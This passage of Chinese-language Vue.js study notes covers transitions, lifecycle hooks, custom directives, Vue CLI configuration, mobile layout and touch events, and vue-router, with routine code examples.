v-enter：定义进入过渡的开始状态。在元素被插入时生效，在下一个帧移除。

v-enter-active：定义过渡的状态。在元素整个过渡过程中作用，在元素被插入时生效，在 transition/animation 完成之后移除。这个类可以被用来定义过渡的过程时间，延迟和曲线函数。

v-enter-to: 2.1.8版及以上 定义进入过渡的结束状态。在元素被插入一帧后生效 (于此同时 v-enter 被删除)，在 transition/animation 完成之后移除。

v-leave: 定义离开过渡的开始状态。在离开过渡被触发时生效，在下一个帧移除。

v-leave-active：定义过渡的状态。在元素整个过渡过程中作用，在离开过渡被触发后立即生效，在 transition/animation 完成之后移除。这个类可以被用来定义过渡的过程时间，延迟和曲线函数。

v-leave-to: 2.1.8版及以上 定义离开过渡的结束状态。在离开过渡被触发一帧后生效 (于此同时 v-leave 被删除)，在 transition/animation 完成之后移除。







##### (1)单元素/组件过渡 

 * css过渡 
 * css动画 
 * 结合animate.css动画库

```
<transition
    leave-active-class="animated fadeOut"
    enter-active-class="animated slideInLeft">
    <p v-if="isShow" class="box"></p>
</transition>
```





##### (2)多个元素的过渡

​	当有相同标签名的元素切换时，需要通过 key 特性设置唯一的值来标记以让 Vue 区分它们，否则 Vue 为了效率只会替换相同标签内部的内容。

​	

```
<div id="app">
        <aaa></aaa>
    </div>
    <template id="aaa">
        <div>
            <button @click="isShow=!isShow">toggle</button>    
            <transition-group name="abc" tag="div">
                <div key="1" v-if="isShow" class="box"></div>
                <div key="2" v-if="isShow" class="box"></div>
                <div key="3" v-if="isShow" class="box"></div>
            </transition-group>
        </div>
    </template>
```



##### (3)列表过渡（设置key）

​	不同于 transition， 它会以一个真实元素呈现：默认为一个 span元素。你也可以 通过 tag 特性更换为其他元素。

​	提供唯一的 key 属性值





##### (4)过渡模式

 	in-out: 新元素先进行过渡，完成之后当前元素过渡离开
 	
 	out-in: 当前元素先进行过渡，完成之后新元素过渡进入





## 十一. [生命周期](https://cn.vuejs.org/images/lifecycle.png)

每一个组件或者实例都会经历一个完整的生命周期，总共分为三个阶段：初始化、运行中、销毁

1. 实例、组件通过new Vue() 创建出来之后会初始化事件和生命周期，然后就会执行beforeCreate钩子函数，这个时候，数据还没有挂载到，只是一个空壳，无法访问到数据和真实的dom，一般不做操作

2. 挂载数据，绑定事件等等，然后执行created函数，这个时候已经可以使用到数据，也可以更改数据,在这里同步更改数据不会触发updated函数，一般可以在这里做初始数据的获取。  做异步ajax，绑定初始化事件  

3. 接下来开始找实例或者组件对应的模板，编译模板为虚拟dom放入到render函数中准备渲染，然后执行beforeMount钩子函数，在这个函数中虚拟dom已经创建完成，马上就要渲染,在这里也可以更改数据，不会触发updated，这是在渲染前最后一次更改数据的机会，不会触发其他的钩子函数，一般可以在这里做初始化数据的获取

4. 接下来开始render，渲染出真实dom，然后执行mounted钩子函数，此时，组件已经出现在页面中，数据、真实dom都已经处理好了,事件都已经挂载好了，可以在这里操作真实dom等事情...

5. 当组件或实例的数据更改之后，会立即执行beforeUpdate，然后vue的虚拟dom机制会重新构建虚拟dom与上一次的虚拟dom树利用diff算法进行对比之后重新渲染，一般不做什么事儿

6. 当更新完成后，执行updated，数据已经更改完成，dom也重新render完成，可以操作更新后的dom

7. 当经过某种途径调用$destroy方法后，立即执行beforeDestroy，一般在这里做一些善后工作，例如清除计时器、清除非指令绑定的事件等等

8. 组件的数据绑定、监听...去掉后只剩下dom空壳，这个时候，执行destroyed，在这里做善后工作也可以





### keep-alive:动态组件

当组件在 <keep-alive> 内被切换，它的 activated 和 deactivated 这两个生命周期钩子函数将会被对应执行。

```
 	<div id="app">
        <button @click="comp=(comp==='my-a'?'my-b':'my-a')">实现组件切换</button>
        <keep-alive>
            <component :is='comp'></component>
        </keep-alive>
    </div>
```

```
Vue.component("my-a",{
        template:"<div>这是my-a组件</div>",
        created(){
            console.log("a-created..")
            // setInterval(()=>{
            //     console.log(1)
            // },3000)
        },
        activated(){
            console.log("activated...")
            this.timer = setInterval(()=>{
                console.log(1)
            },3000)
        },
        deactivated(){
            console.log("deactivated...")
            clearInterval(this.timer)
        },
        beforeDestroy(){
            console.log("a-beforeDestroy...")
        }
    })
    Vue.component("my-b",{
        template:"<div>这是my-b组件</div>"
    })

    new Vue({
        el:"#app",
        data:{
            comp:"my-a"
        }
    })
```













### nextTick

Vue.nextTick()   or  this.$nextTick()

在下次 DOM 更新循环结束之后执行延迟回调。

在修改数据之后立即使用这个方法，获取更新后的 DOM。

```
// 修改数据
vm.msg = 'Hello'
// DOM 还没有更新
Vue.nextTick(function () {
  // DOM 更新了
})

// 作为一个 Promise 使用 (2.1.0 起新增，详见接下来的提示)
Vue.nextTick()
  .then(function () {
    // DOM 更新了
  })
```











## 十二. 自定义指令

自定义指令介绍 directives - **对普通 DOM 元素进行底层操作**

### (1) 自定义指令注册

当页面加载时，该元素将获得焦点 (注意：`autofocus` 在移动版 Safari 上不工作)。事实上，只要你在打开这个页面后还没点击过任何内容，这个输入框就应当还是处于聚焦状态。现在让我们用指令来实现这个功能：

```
// 注册一个全局自定义指令 `v-focus`
Vue.directive('focus', {
  // 当被绑定的元素插入到 DOM 中时……
  inserted: function (el) {
    // 聚焦元素
    el.focus()
  }
})
```

如果想注册局部指令，组件中也接受一个 `directives` 的选项：

```
directives: {
  focus: {
    // 指令的定义
    inserted: function (el) {
      el.focus()
    }
  }
}
```

然后你可以在模板中任何元素上使用新的 `v-focus` 属性，如下：

```
<input v-focus>
```





### (2) 自定义指令钩子

\* bind,inserted,update,componentUpdated,unbind

\* 参数 el,binding,vnode,oldvnode



> *指令定义函数提供了几个钩子函数（可选）：*

**bind：**只调用一次，指令第一次绑定到元素时调用。用这个钩子函数可以定义一个在绑定时执行一次的初始化动作。

**inserted：**被绑定元素插入父节点时调用（父节点存在即可调用）。

**update：**所在组件的 VNode 更新时调用，**但是可能发生在其子 VNode 更新之前**。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新

**componentUpdated：**指令所在组件的 VNode **及其子 VNode** 全部更新后调用。

**unbind：**只调用一次， 指令与元素解绑时调用。





> *钩子函数的参数：(el, binding, vnode, oldVnode)*

​		el：指令所绑定的元素，可以用来直接操作 DOM 。

　　binding：一个对象，包含以下属性

　　　　name：指令名，不包含v-的前缀；

　　　　value：指令的绑定值；例如：v-my-directive="1+1"，value的值是2；

　　　　oldValue：指令绑定的前一个值，仅在update和componentUpdated钩子函数中可用，无论值是否改变都可用；

　　　　expression：绑定值的字符串形式；例如：v-my-directive="1+1"，expression的值是'1+1'；

　　　　arg：传给指令的参数；例如：v-my-directive:foo，arg的值为 'foo'；

　　　　modifiers：一个包含修饰符的对象；例如：v-my-directive.a.b，modifiers的值为{'a':true,'b':true}

　　vnode：Vue编译的生成虚拟节点；

　　oldVnode：上一次的虚拟节点，仅在update和componentUpdated钩子函数中可用。





> 自定义指令钩子函数的案例展示：

```
<div id="app">
    <my-comp v-if="msg" :msg="msg"></my-comp>
    <button @click="update">更新</button>
    <button @click="uninstall">卸载</button>
    <button @click="install">安装</button>
</div>
<script type="text/javascript">
    Vue.directive('hello', {
        bind: function (el){
            console.log('bind');
        },
        inserted: function (el){
            console.log('inserted');
        },
        update: function (el){
            console.log('update');
        },
        componentUpdated: function (el){
            console.log('componentUpdated');
        },
        unbind: function (el){
            console.log('unbind');
        }
    });

    var myComp = {
        template: '<h1 v-hello>{{msg}}</h1>',
        props: {
            msg: String
        }
    }

    new Vue({
        el: '#app',
        data: {
            msg: 'Hello'
        },
        components: {
            myComp: myComp
        },
        methods: {
            update: function (){
                this.msg = 'Hi';
            },
            uninstall: function (){
                this.msg = '';
            },
            install: function (){
                this.msg = 'Hello';
            }
        }
    })
</script>
```

a、页面加载时：bind inserted

b、更新组件：update componentUpdated

c、卸载组件：unbind

d、重新安装组件：bind inserted

**注意区别：**

bind与inserted：bind时父节点为null，inserted时父节点存在；

update与componentUpdated：update是数据更新前，componentUpdated是数据更新后。







### (3) 函数简写

之前的写法：

```
Vue.directive("color",{
    bind(el,binding){ //只会执行一次！
    	el.style.backgroundColor = binding.value
    },
    update(el,binding){
    	el.style.backgroundColor = binding.value
    }
})
```



大多数情况下，我们可能想在 bind 和 update 钩子上做重复动作，并且不想关心其它的钩子函数。可以这样写:

```
Vue.directive('color-swatch', function (el, binding) {
  el.style.backgroundColor = binding.value
})
```





### (4) 对象字面量

如果指令需要多个值，可以传入一个 JavaScript 对象字面量。记住，指令函数能够接受所有合法类型的 Javascript 表达式。

```
<div v-demo="{ color: 'white', text: 'hello!' }"></div>

Vue.directive('demo', function (el, binding) {
  console.log(binding.value.color) // => "white"
  console.log(binding.value.text)  // => "hello!"
})
```













## 十三. Vue-cli使用

现在使用前端工程化开发项目是主流的趋势，也就是说，我们需要使用一些工具来搭建vue的开发环境。一般情况下我们都会选择使用webpack进行项目的构建，在这里我们直接使用vue官方提供的，基于webpack的脚手架工具进行项目开发。

注意： 要求node.js版本是8+

### **安装方法**

> 全局安装vue-cli: 

**npm install -g @vue/cli**

or

**yarn global add @vue/cli**



**检测安装：**

**vue  -V**   





### [**脚手架创建项目**](https://cn.vuejs.org/v2/guide/installation.html#%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-CLI)

vue create 项目名称

这里如果你是第一次使用脚手架进行项目创建的话，是只有两项提示。

第一项是默认配置，我们一般选择第二项自定义配置进行项目构建。



我们可以自由的选择哪些配置，按键盘上下键进行选中，安装。

选中哪一个，通过键盘空格键确定，所有的都选择完毕后，按键盘的Enter键进行下一步。



需要注意的是：模板创建的时候会询问需要使用EsLint来标准化我们的代码规范

https://www.cnblogs.com/mingjian/p/9361027.html





### [单文件组件](https://cn.vuejs.org/v2/guide/single-file-components.html)

vue中的单文件组件包含三部分：**template  script  style** 

内部配置wepack的**vue-loader**来去解析处理解析以.vue为后缀名的单文件组件

- style标签 加上scoped属性，css局部生效 

    [scoped穿透问题！](https://www.jianshu.com/p/0bc2a4b823d4)

- style标签 加上lang="scss"，支持scss



**注意：**

#### 	1) 关闭eslint

​	如果当前项目使用了eslint，并且需要关闭。需要创建[vue.config.js](https://cli.vuejs.org/zh/guide/cli-service.html#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4)文件，采用如下代码：

​	

```
module.exports = {
    devServer: {  //开发环境下，对于浏览器的esLint遮罩层的关闭
        overlay: {
          warnings: false,
          errors: false
        }
    },
    lintOnSave:false //直接关闭eslint检查规则关闭了
}
```



对于eslint某条规则进行单独的关闭：

eslinttrc.js

```
rules: {
    'quotes': 'off',   //让其关闭对于引号验证
    'space-before-function-paren':'off',//对于关键字前面空格验证
    'no-console': process.env.NODE_ENV === 'production' ? 'warn' : 'off',
    'no-debugger': process.env.NODE_ENV === 'production' ? 'warn' : 'off'
  }
```



终极策略： eslint规则，当我们ctrl+s 保存的时候，让其自动帮助改正。

1. 升级最新的版本
2. 安装eslint插件
3. ctrl+shift+p  首选项打开设置  settings.json

```
   "editor.codeActionsOnSave": {    // 编辑代码保存的时候，开启自动修复eslint
        "source.fixAll.eslint":true 
    },
    "eslint.workingDirectories": [  // 自动找到eslint目录，进行修复
        {"mode": "auto"}
    ],
    "vetur.ignoreProjectWarning": true,
    "vetur.validation.template": false,
```

4.  查看--》外观--》显示状态栏   点击底部eslint-->allow（允许使用eslint对于代码进行检查）

注意：eslint保存的时候忽然缩进4个空格问题：

https://blog.csdn.net/weixin_43485335/article/details/108379638







#### 	2) proxy代理配置

```
devServer: {
	 open:true, //自动开启浏览器
     port:8000, //随便改端口号
     proxy: {
         '/api': {
             target: 'https://*.*.com',
             host: '*.*.com',
             changeOrigin:true,
             pathRewrite:{
             	'^/api':''
             }
         }
     }
}
```

```
// axios请求猫眼的数据  因为后端没有设置CORS字段，需要前端通过proxy代理解决
axios.get('/api/ajax/movieOnInfoList?token=&optimus_uuid=A455C0E0F66311EAB68535C86A5B6D1156E0B73EE0934BC586655D13ADC60663&optimus_risk_level=71&optimus_code=10').then(res => {
      console.log(res)
 })
```





正向代理代理客户端     前端  <---->  vpn  <---->  google数据

反向代理代理服务器     前端  -----> 代理服务器  （A/B/C）





#### 	3) alias别名配置

```
configureWebpack: {
    resolve: {
        alias: {
            'assets': '@/assets',
            'con': '@/components',
            'views': '@/views',
        }
    }
}
```



#### 	4) 打包路径配置

```
// 基本路径
publicPath: '/vue-demo'
```











## 十四. 移动端开发

我们现在关注的点还在移动M站上，或者我们可以叫做webapp，其实就是运行在移动端浏览器中的web网站。

app:application应用程序。

手机软件:主要指安装在智能手机上的软件，完善原始系统的不足与个性化。

移动端开发是与PC端肯定是有很大不同的，所以我们需要学习如何在移动设备上开发完美适配的app

开发移动端应用我们需要学习的知识点可以分成如下几个：

1. 移动端布局适配

2. 移动端事件

3. 移动端交互效果

4. 移动端前端框架

5. 移动端调试

### 移动端布局适配

> 从屏幕尺寸、屏幕类型等方面来看的话，移动设备和PC设备大有不同，所以从布局、适配等方面都需要我们考虑到

#### Viewport视口的作用 (在移动端浏览器上面用来显示网页的那一块区域)

在很久以前，我们的设备还不是智能设备的时候，设备访问智能访问到网页的左上角（当时都是pc网站），查看全部内容需要通过滚动条

慢慢的我们发现，我们的一个页面放到移动端中访问的时候，没有滚动条了，但是内容都缩小了

这是因为我们有了一个叫做**viewport**的一个东西

网页不是直接放入浏览器中的，而是先放入到viewport中，然后viewport在等比缩放到浏览器的宽度，放入浏览器，viewport在缩放的过程中，网页内容也被缩小了

网页访问到的clientWidth其实是viewport的宽度

这样的话我们需要做一些处理，其实问题的根源在于viewport的宽度和浏览器宽度不一样，如果我们能将其设置为一样的话，不会出现这样的问题了

我们可以通过meta标签来设置viewport将其设置为浏览器的宽度，也就是设备的宽度，这样的话布局就会简单多了

##### viewport的宽度

当浏览器宽度小于980的时候，宽度就是980，当浏览器尺寸宽度大于980的时候，宽度和浏览器宽度一致


##### 通过meta标签来设置viewport

<meta> 标签提供关于 HTML 文档的元数据。它不会显示在页面上，但是对于机器是可读的。可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。





[meta标签大全](http://blog.csdn.net/yc123h/article/details/51356143)

<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  




meta viewport 的6个属性：

| width         | 设置layout viewport 的宽度，为一个正整数，或字符串"width-device" |
| ------------- | -----------------------------------------------------------: |
| initial-scale |                 设置页面的初始缩放值，为一个数字，可以带小数 |
| minimum-scale |                 设置页面的最小缩放值，为一个数字，可以带小数 |
| maximum-scale |                 允许用户的最大缩放值，为一个数字，可以带小数 |
| height        |       设置layout viewport 的高度，这个属性并不重要，很少使用 |
| user-scalable | 是否允许用户进行缩放，值为"no"或"yes", no 代表不允许，yes代表允许 |



#### 移动端布局方式与设计图

现有的布局方式：

1. 固定布局，每一个元素都是固定的尺寸，内容区域居中在浏览器中间

   内容区域的尺寸：980,1000,1100,1200


2. 响应式布局，利用媒体查询来实现不同尺寸的浏览器显示结构不一样  @media  根据浏览器分辨率大小进行适配

   一般会有三张设计图，PC,平板,手机

3. 自适应布局，属于响应式里的一种，利用rem、百分比、vwvh等布局单位来实现

   设计图一般只有一张，640、750居多

   

#### 移动端布局

移动的屏幕和PC的屏幕有一个很大的区别，**移动端是视网膜高清屏（Retina）**

**retina屏幕有一个属性叫DPR（设备像素缩放比） = 物理像素/逻辑像素**

例如，iphone 6手机商宣传手机的尺寸是：750宽，这个值就是物理像素，而从开发者眼里我们所指的其实是375px（逻辑像素）

**在dpr为2的手机中，我们的一个逻辑像素会从横纵两个方向分别以2个像素点来渲染**

如果不管dpr的话，其实我们布局依然可以，因为我们设置一个像素宽高的东西的话，在手机上看见的基本也就是这么大，至于手机设备用多少个物理像素去渲染，大小还是不会变化的

设计师出图都是2倍的，是因为，在页面中除了字体（矢量图）大部分都是位图，也就是如果一个像素宽高的盒子里准备放入图片，如果图片的尺寸也是一个像素宽高的话，因为其实在移动端渲染的时候是用四个像素来渲染，图片会失真，但是如果我们给一像素宽高的盒子放入2像素宽高的图片的话，就不会失真

##### 布局单位

>因为我们的移动设备有很多种，所以我们的布局不可能是固定布局，所以我们要使用自适应布局

我们在开发中可以选用很多自适应布局单位，这些单位必须满足一个条件

1. % 

   优点：简单，无需设置，兼容性好
   缺点：基于父元素的属性来设置，如果父元素没有宽高，设置无效

2. vwvh

   一个vw等于viewport宽度的百分之一，一个vh等于viewport高度的百分之一
   vmax等于vw和vh中较大的那个  vmin等于vw和vh中较小的那个

   优点：简单，无需设置
   缺点：兼容性不好

3. rem

   一个rem等于根元素（html）的字体大小，兼容性很好

   优点：兼容好，使用简单
   缺点：需要设置


##### rem与适配

当我们想使用一个自适应单位的时候，发现%有缺陷，vwvh兼容性差，弹性盒所针对的是元素排列的问题，只适用于某种情况，所以我们就想，能给我一个没啥上面的缺陷的单位，想到了rem

rem的兼容性好一点，它也确实是一个布局单位，不受父子元素的影响，设置了rem之后，也不会对px、em等单位造成影响，它是一个理想的单位

**rem也有一个致命的问题，就是它不是一个自适应的单位，不会跟着设备尺寸不同而不同，但是没有关系，我们有万能的js，可以去动态的设置它**


###### 方法1：

我们可以将1rem设置成屏幕的某一个比例，比如将1rem设置成屏幕的十分之一

假设我们的设计图是640宽的，我们拿到之后量了一下a的宽度为480px，得到比例a所占屏幕3/4，根据rem与屏幕的关系，最后设置成7.5rem

就是说在设置元素的宽度是时候，会根据设定好的比例关系去进行换算



<script>
    document.documentElement.style.fontSize = document.documentElement.clientWidth/10 + 'px'
</script>


###### 方法2：

如果设计图是640的图，这个时候我们知道它是照着i5来的，我们现在假设世界上所有的手机都是320的，也就是每一个人用的都是i5，在这个理想的情况下，因为手机都一样，尺寸都一样，和pc端的固定布局也就一样了

假设有一个在640的图上我们量得的宽度是320，因为是二倍图，所以我们知道，它的实际宽度是160px，这样的话，我们直接给这个设置设置width：160px就可以了，这个时候，我们玩个花子，不要单纯的使用px来设置，用rem来设置，例如，我可以将rem设置为100px，这样的，刚才的盒子设置为width：1.6rem，算法就是 量的宽度/(dpr*100) = 要设置的rem值

这样我们就可以开心的开发，量一个尺寸，除个2，再小数点推两位，设置就行了，但是我们也知道，手机的尺寸并不可能都是320，这样的话，没有关系，我们可以根据一个比例来算rem到底设置为多少

在手机宽度为320的时候，我们设置的1rem=100px，所以有一个比例 b = 100/320

那么在W宽度的手机上，1rem应该是多少呢？设为x   那么x/w = b

得到x = w/3.2

那么就不要写死html的fontsize为100了。而是用js去设置：

**document.documentElement.style.fontSize = document.documentElement.clientWidth/3.2 + 'px'** 

这样，我们就可以得到一个自适应的rem 



##### rem+vw进行适配

https://www.cnblogs.com/tu-0718/p/10826846.html

https://www.jb51.net/css/731937.html

100vw = 750px ---->  13.333333vw = 100px ---->  html:{font-size:13.3333333vw}








##### 常见的需要注意的问题

1. [1px边框](https://www.jianshu.com/p/5ff121936666)

   在移动端中，如果给元素设置一个像素的边框的话，那么在手机上看起来是会比一个像素粗的。

   解决方法：使用伪类元素模拟边框，使用transform缩放



​	   例如google浏览器支持的最小字体是12px,如何让其支持更小字体?

```
  transform:scale()  //css3新特性   （关键帧、transform、nth-child高级选择器）
```



2. 响应式图片

   在移动端中，图片的处理应该是很谨慎的，假设有一张图片本身的尺寸是X宽，设置和包裹它的div一样宽，如果是div宽度小于图片宽度没有问题，但是如果div宽度大于图片的宽度，图片被拉伸失真

   解决方法：让图片最大只能是自己的宽度

```
    img{
        max-width: 100%;
        display: block;
        margin: 0 auto;
    }
```

---



### 移动端事件

移动端中的事件和PC的事件有一些是不同的，例如，mouse部分事件在移动端里没有了

取而代之的是touch事件：

touchstart/touchmove/touchend/touchcancel（玩游戏 忽然来电话）

添加事件的时候可以用ontouchstart，但是有的时候很可能失效，建议使用addEventListener的方式

touchcancel比较少见，在系统取消触摸的时候触发


touch事件对象里面的属性和mouse的略有不同，例如在mouse事件里可以直接从事件对象里取出pageX,clientX,screenX

touch事件对象里有touches,changedTouches,targetTouches三个属性，上面保存着关键的位置信息

它们里面保存的是触发事件的手指的信息，但是要注意，虽然三个里面保存的信息看似都一样，但是在touchend事件里，只能使用changedTouches



##### click的300ms延迟问题 

在移动端中，click事件是生效的，但是它有一个问题，点击之后会有300ms的延迟响应

原因：safari是最早做出这个机制的，因为在移动端里，浏览器需要等待一段事件来判断此次用户操作是单击还是双击，所以就有click300ms的延迟机制，Android也很快就有了

1. 不用click，用自定义事件tap

   tap是需要自定义的：如果用户执行了touchstart在很短的时间又触发了touchend，且两次的距离很小，而且不能触发touchmove

   使用zepto类库的时候，里面自带tap事件,，但是需要在zepto.js后面加上一段js

   [zepto官网](http://www.css88.com/doc/zeptojs_api/#);[Touch模块](https://github.com/madrobby/zepto/blob/master/src/touch.js#files)

   百度有一款touch.js的插件[教程](http://blog.csdn.net/libin_1/article/details/50534611)

   hammer.js也是一个手势事件库[文档](http://hammerjs.github.io/)

2. 引入fastclick库来解决

   



##### 点透bug的产生

点透bug有一个特定的产生情况：

当上层元素是tap事件，且tap后消失，下层元素是click事件。这个时候，tap上层元素的时候就会触发下层元素的click事件

解决方式：

1. 上下层都是tap事件，缺点：a标签等元素本身就是自带的click事件，更改为tap比较困难

2. 缓动动画，让上层元素消失的时候不要瞬间消失，而是以动画的形式消失，事件超过300ms就可以了

3. 使用中间层,添加一个透明的中间元素，给它添加click事件并消失，这个时候接收点透的是透明的中间层

4. 使用fastclick

     

### 移动端测试

1. 使用chrome浏览器有移动设备模拟功能，在这里可以做一些模拟测试，但是要注意的是，毕竟不是真机，会有一些测试不到的问题

2. 手机连接上电脑的无线，总之使其在同一个网络里，然后就可以通过ip访问

需要测试的浏览器：

chrome，firefox，UC,百度，QQ，微信，Android，safari



### 移动端交互

动画效果全部使用css3

###### JQ生成二维码

可以使用jquery.qrcode.js插件，可以快速的生成基于canvas绘制的二维码

###### 兼容查阅网站

[can i use ](https://caniuse.com/),在这里可以查看很多属性、api的兼容性









## 十五. vue-router

现在的应用都流行SPA应用（single page application）

传统的项目大多使用多页面结构，需要切换内容的时候我们往往会进行单个html文件的跳转，这个时候受网络、性能影响，浏览器会出现不定时间的空白界面，用户体验不好

**单页面应用就是用户通过某些操作更改地址栏url之后，动态的进行不同模板内容的无刷新切换，用户体验好。**

**Vue中会使用官方提供的vue-router插件来使用单页面，原理就是通过检测地址栏变化后将对应的路由组件进行切换（卸载和安装）**



> SPA vs MPA

<img src="https://s1.ax1x.com/2020/06/01/t8pJ8U.png" alt="spa"  />









### 简单路由实现

> yarn add vue-router

1. 引入vue-router，如果是在脚手架中，引入VueRouter之后，需要通过Vue.use来注册插件

   src/router/index.js

```
    import Vue from 'vue'
    import Router from 'vue-router'
    Vue.use(Router) // 背后的原理调用了插件的内部的install方法
```

2. 创建router路由器

```
    const router = new Router({
      routes:[ // 路径与视图的映射的数组
        {path:"/home",component:Home}
      ]
    })
    export default router
```

3. 创建路由表并配置在路由器中

```
    var routes = [
        {path,component}//path为路径，component为路径对应的路由组件
    ]

    new Router({
        routes
    })
```

4. 在根实例里注入router,目的是为了让所有的组件里都能通过this.$router、this.$route来使用路由的相关功能api

```
    import router from "./router/index.js"
    new Vue({
     	render: h => h(App),
  		router // 组件实例的this上面就会有路由相关的api了（$route/$router）
    }).$mount('#app')
```

5. 利用**router-view**来指定路由切换的位置

6. 使用router-link来创建切换的工具，会渲染成a标签，添加to属性来设置要更改的path信息，且会根据当前路由的变化为a标签添加对应的router-link-active/router-link-exact-active（完全匹配成功）类名

```
<router-link to="main">main</router-link>
<router-link to="news">news</router-link>

.router-link-active{
    color:red;
}
```



### [路由的懒加载](https://www.cnblogs.com/lijuntao/p/7777581.html)    

懒加载也叫延迟加载，即在需要的时候进行加载，随用随载。在单页应用中，如果没有应用懒加载，运用webpack打包后的文件将会异常的大，造成进入首页时，需要加载的内容过多，延时过长，不利于用户体验，而**运用懒加载则可以将页面进行划分，需要的时候加载页面，可以有效的分担首页所承担的加载压力，减少首页加载用时**。

非按需加载则会把所有的路由组件块的js包打在一起。当业务包很大的时候建议用路由的按需加载（懒加载）。
按需加载会在页面第一次请求的时候，把相关路由组件块的js添加上；

```
{
  path: '/about',
  name: 'about',
  component: () => import('@/views/About')    //采用了路由懒加载方式(异步组件+webpack代码分割)
}
```






### 多级路由

在创建路由表的时候，可以为每一个路由对象创建children属性，值为数组，在这个里面又可以配置一些路由对象来使用多级路由，注意：一级路由path前加'/'

```  
{
    path: '/films', // 在url地址栏上面输入的路径
    component: Films, // 对应url地址栏路径的视图组件
    children: [ // 在配置films的二级路由  /films/nowplaying/abc
      { path: '/films/nowplaying', component: Nowplaying, name: 'np' },
      { path: 'comingsoon', component: ComingSoon, name: 'cs' },
      { path: '', redirect: '/films/nowplaying' }
    ]
  },
```

二级路由组件的切换位置依然由router-view来指定（指定在父级路由组件的模板中）

```
<p>
    <router-link to='/films/nowplaying'>正在热映</router-link>
    <router-link :to='{name:"cs"}'>即将上映</router-link>
</p>

<router-view></router-view>
```



### 默认路由和重定向

当我们进入应用，默认像显示某一个路由组件，或者当我们进入某一级路由组件的时候想默认显示其某一个子路由组件，我们可以配置默认路由：

```
{path:'',component:Main}
```

当我们需要进入之后进行重定向到其他路由的时候，或者当url与路由表不匹配的时候：

```
{path:'/',redirect:'/main'}
///...放在最下面
{path:'*',redirect:'/main'},
```



### 命名路由

我们可以给路由对象配置name属性，这样的话，我们在跳转的时候直接写name:main就会快速的找到此name属性对应的路由，不需要写大量的urlpath路径了

```
{
    path: '/films', // 在url地址栏上面输入的路径
    component: Films, // 对应url地址栏路径的视图组件
    children: [ // 在配置films的二级路由
      { path: '/films/nowplaying', component: Nowplaying, name: 'np' },
      { path: 'comingsoon', component: ComingSoon, name: 'cs' }, //通过name命名路由
      { path: '', redirect: '/films/nowplaying' }
    ]
  },
```

```
 <router-link :to='{name:"cs"}'>即将上映</router-link>
```





### 动态路由匹配    

有的时候我们需要在路由跳转的时候跟上参数，路由传参的参数主要有两种：路由参数、queryString参数

路由参数需要在路由表里设置

```
{
	path:'/detail/:id',
	component:Detail
}
```

上面的代码就是给User路由配置接收id的参数，多个参数继续在后面设置

在组件中可以通过**this.$route.params**来使用

queryString参数不需要在路由表设置接收，直接设置？后面的内容，在路由组件中通过**this.$route.query**接收




##### prop将路由与组件解耦

在组件中接收路由参数需要this.$route.params.id,代码冗余，现在可以在路由表里配置props：true

```
{path:'detail/:id',component:AppNewsDetail,name:'detail',props:true}
```

在路由自己中可以通过props接收id参数去使用了

props:['id']

> s面试题？

vue-router 核心的标签？       router-link   router-view

vue-router核心的api属性？  $route（动态路由参数） vs  $router(编程式导航  push go back forward replace等)







### 声明式导航 router-link

<router-link> 组件支持用户在具有路由功能的应用中（点击）导航。 通过 to 属性指定目标地址，默认渲染成带有正确链接的 <a> 标签，可以通过配置 tag 属性生成别的标签.。另外，当目标路由成功激活时，链接元素自动设置一个表示激活的 CSS 类名。

router-link的to属性，默认写的是path（路由的路径），可以通过设置一个对象，来匹配更多

```
:to='{name:"detail",params:{id:_new.id},query:{content:_new.content}}'
```

name是要跳转的路由的名字，也可以写path来指定路径，但是用path的时候就不能使用params传参，params是传路由参数，query传queryString参数

replace属性可以控制router-link的跳转不被记录   

active-class属性可以控制路径切换的时候对应的router-link渲染的dom添加的类名



> *vue-router3中对于tag属性，报警告的处理方案：*
>
> https://next.router.vuejs.org/zh/guide/advanced/extending-router-link.html

```
<!--tabbar里面声明式导航跳转-->
    <router-link
      v-for='nav in navLink'
      :key='nav.id'
      :to='nav.path'
      //active-class="active"
      
      custom
      v-slot="{ isActive,navigate }"
  >
    <li :class="isActive ? 'active' : '' "  @click="navigate">{{nav.title}}</li>
  </router-link>
```







### 编程式导航

有的时候需要在跳转前进行一些动作，router-link直接跳转，需要在方法里使用$router的方法

编程式导航方法： go/back/forward/push/replace等

this.$router.push(path) 



`$route vs  $router?`

$route是路由对象，里面可以包含一些路由的参数，例如获取动态参数： this.$route.params.id  |  this.$route.query.title

$router是路由实例对象，上面可以访问到路由的编程式导航的方法。例如push/replace/go/back等






### 路由模式

为了构建SPA（单页面应用），需要引入前端路由系统，这也就是Vue-router存在的意义。前端路由的核心，就在于 ——— 改变视图的同时不会向后端发出请求。

路由有两种模式：hash、history，默认会使用hash模式，但是如果url里不想出现丑陋hash值，在new VueRouter的时候配置mode值为history来改变路由模式，本质使用H5的histroy.pushState方法来更改url，不会引起刷新.

history模式，会出现404 的情况，需要后台配置。

因为我们的应用是个单页客户端应用，如果后台没有正确的配置，当用户在浏览器直接访问 http://oursite.com/user/id 就会返回 404，这就不好看了。

所以呢，你要在服务端增加一个覆盖所有情况的候选资源：如果 URL 匹配不到任何静态资源，则应该返回同一个 index.html 页面，这个页面就是你 app 依赖的页面。

https://www.cnblogs.com/leyan/p/8677274.html

https://blog.csdn.net/ygh5123687/article/details/89473578



hash模式背后原理： 其实就是调用了window.onhashchange方法 hash值的切换

history模式的原理： 本质使用H5的histroy.pushState方法来更改url



#### hash模式和history模式的区别 

- hash模式较丑，history模式较优雅
- hash兼容IE8以上，history兼容IE10以上
- history模式需要后端配合将所有访问都指向index.html，否则用户刷新页面，会导致404错误




### 路由守卫

在某些情况下，当路由跳转前或跳转后、进入、离开某一个路由前、后，需要做某些操作，就可以使用路由钩子来监听路由的变化

#### 全局路由钩子：

```
router.beforeEach((to, from, next) => {
    //会在任意路由跳转前执行，next一定要记着执行，不然路由不能跳转了
  console.log('beforeEach')
  console.log(to,from)
  next()
})

router.afterEach((to, from) => {
    //会在任意路由跳转后执行
  console.log('afterEach')
})
```



#### 单个路由钩子：

只有beforeEnter，在进入前执行，to参数就是当前路由

```
 routes: [
    {
      path: '/foo',
      component: Foo,
      //进入到Foo组件之前调用！
      beforeEnter: (to, from, next) => {
        // ...
      }
    }
  ]
```



